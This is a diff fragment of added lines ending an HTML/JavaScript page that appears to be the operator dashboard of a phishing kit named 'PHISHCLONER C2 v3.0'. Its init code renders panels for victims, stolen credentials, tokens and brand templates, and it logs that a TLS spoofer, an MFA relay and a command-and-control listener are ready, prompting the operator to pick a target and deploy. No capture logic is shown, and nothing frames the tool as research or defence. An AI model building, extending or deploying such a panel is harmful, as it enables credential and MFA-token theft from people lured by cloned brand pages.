+  renderVictims();
+  renderCredsTable();
+  renderTokens();
+  renderTemplates();
+  renderEngineStatus();
+  renderRecentCaptures();
+  log('═══════════════════════════════════════════', 'info');
+  log('  PHISHCLONER C2 v3.0 — NOCTURNE', 'info');
+  log('  ghost1o1 · "There is no lock."', 'info');
+  log('═══════════════════════════════════════════', 'info');
+  log('[*] 9 engine modules loaded', 'ok');
+  log('[*] 20 brand templates ready', 'ok');
+  log('[*] TLS spoofer armed', 'ok');
+  log('[*] MFA relay ready', 'ok');
+  log('[*] C2 listening on :5000 (WS) + :8443 (TLS)', 'ok');
+  log('[*] Configure target → DEPLOY to start', 'info');
+  updateReport();
+  if (location.hash) ui(location.hash.slice(1));
+  console.log('%c◆ PHISHCLONER C2 v3.0 · NOCTURNE ◆', 'color:#a855f7;font-weight:800;font-size:14px;letter-spacing:.1em');
+}
+
+if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+else init();
+</script>
+</body>
+</html>
